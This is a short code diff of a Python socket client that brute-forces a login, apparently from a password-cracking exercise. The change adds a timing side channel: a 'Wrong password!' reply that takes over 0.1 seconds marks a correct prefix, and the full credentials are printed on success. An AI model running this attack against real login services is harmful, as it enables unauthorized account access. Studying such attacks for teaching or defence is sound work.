@@ -36,14 +36,18 @@ with socket.socket() as client_socket:
                                     'login': login,
                                     'password': try_pass
                                 }
+                                start = datetime.now()
                                 client_socket.send(json.dumps(json_to_send_pass).encode())
                                 response = client_socket.recv(1024)
                                 response = response.decode()
+                                end = datetime.now()
                                 result_pass = json.loads(response)['result']
-                                if result_pass == 'Exception happened during login':
-                                    marked_chars = try_pass
-                                    break
-                                elif result_pass == 'Connection success!':
+                                if result_pass == 'Connection success!':
+                                    json_to_send_pass['password'] = try_pass
                                     print(json.dumps(json_to_send_pass))
                                     client_socket.close()
                                     exit()
+                                elif result_pass == 'Wrong password!':
+                                    if (end - start).total_seconds() > 0.1:
+                                        marked_chars = try_pass
+                                        break
